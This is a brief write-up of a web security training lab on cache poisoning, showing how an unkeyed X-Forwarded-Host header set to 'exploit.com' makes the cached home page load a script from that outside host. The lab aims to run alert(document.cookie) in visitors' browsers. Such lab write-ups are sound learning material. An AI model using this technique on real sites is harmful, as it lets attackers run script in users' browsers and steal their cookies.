# Description
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

# Solution

Add header to get request to `/`

X-Forwarded-Host: exploit.com

In response we can see: 

```html
<script type="text/javascript" src="//exploit.com/resources/js/tracking.js">
```

> [!warning]
For some reason ParamMiner maybe wrongly makes requests and i couldnt able to solve the lab. Disable ParamMiner

